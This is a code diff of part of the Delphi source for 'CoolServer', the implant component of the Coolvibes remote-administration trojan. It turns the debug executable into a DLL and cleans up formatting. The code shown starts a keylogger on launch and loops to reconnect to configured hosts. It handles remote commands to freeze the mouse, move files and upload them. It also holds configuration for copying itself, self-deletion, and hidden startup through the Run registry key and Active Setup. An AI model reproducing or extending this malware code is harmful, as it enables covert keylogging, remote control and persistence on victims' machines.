@@ -12,14 +12,14 @@
 
      El equipo Coolvibes
 *)
-//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
-program coolserver;  //Para debug, más lineas "Para debug" abajo
+library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
+//program CoolServer; //Para debug, más lineas "Para debug" abajo
 uses
   Windows,
   SysUtils,
-  //  ScktComp,
-  //  MMSystem, Elimina: mcisendstring
-  ShellAPI,  //Unit de la shell
+  // ScktComp,
+  // MMSystem, Elimina: mcisendstring
+  ShellAPI, //Unit de la shell
   Classes,
   lomtask,
   lomlib,
@@ -427,8 +427,8 @@ const
               //activar congelar mouse
               TemblarMouse(False); //El mouse para de temblar si se congela
               CongelarMouse(True);
-              {sleep(10000);            //recomendado para debug :p
-              CongelarMouse(False);         }
+              {sleep(10000); //Recomendado Para debug :p
+              CongelarMouse(False);}
               SendText('CONGELARMOUSE|Activado' + ENTER);
             end
             else
@@ -882,7 +882,7 @@ const
             Recibido   := Trim(Recibido);
             ThreadInfo := TThreadInfo.Create(host, port,
               IntToStr(SH), Recibido, 'GETFILE', 0);
-            //ThreadedTransfer(Pointer(ThreadInfo)); //para debug
+            //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug
             BeginThread(nil,
               0,
               Addr(ThreadedTransfer),
@@ -924,8 +924,8 @@ const
             ThreadInfo.RemoteFileName := FilePath;
             ThreadInfo.UploadSize := StrToInt(Recibido);
             ThreadInfo.Hash := Tempstr;
-            //ThreadedTransfer(Pointer(ThreadInfo)); //para debug
-            //exit; //para debug junto a la linea anterior
+            //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug
+            //exit; //Para debug junto a la linea anterior
             BeginThread(nil,
               0,
               Addr(ThreadedTransfer),
@@ -1107,12 +1107,12 @@ const
     Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
 
     BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
-    OnServerInitKeylogger();  //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
+    OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   
     while True do
     begin
       iniciar();
-      sleep(1000 * 10);//duermo 10 seg antes de conectar de nuevo
+      sleep(1000 * 10); //Duermo 10 seg antes de conectar de nuevo
     end;
   end;
 
@@ -1120,19 +1120,17 @@ const
 
 begin
     //Para debug:
-
-    Configuracion.sHosts   := 'localhost:3460¬';
-    Configuracion.sID     := 'Coolserver';
-    Configuracion.bCopiarArchivo := False; //Me copio o no?
-    Configuracion.sFileNameToCopy := 'coolserver.exe';
-    Configuracion.sCopyTo := 'C:\';
+    {Configuracion.sHosts                 := 'localhost:3360¬';
+    Configuracion.sID                     := 'Coolserver';
+    Configuracion.bCopiarArchivo          := False; //Me copio o no?
+    Configuracion.sFileNameToCopy         := 'coolserver.exe';
+    Configuracion.sCopyTo                 := 'C:\';
     Configuracion.bCopiarConFechaAnterior := False;
-    Configuracion.bMelt   := False;
-    Configuracion.bArranqueRun := False;
-    Configuracion.sRunRegKeyName := 'Coolserver';
-    Configuracion.bArranqueActiveSetup := False;
-    Configuracion.sActiveSetupKeyName := 'blah-blah-blah-blah';
-    CargarServidor(@configuracion);
-    //
-    //Fin de para debug
+    Configuracion.bMelt                   := False;
+    Configuracion.bArranqueRun            := False;
+    Configuracion.sRunRegKeyName          := 'Coolserver';
+    Configuracion.bArranqueActiveSetup    := False;
+    Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
+    CargarServidor(@configuracion);}
+    //Fin de Para debug
 end.
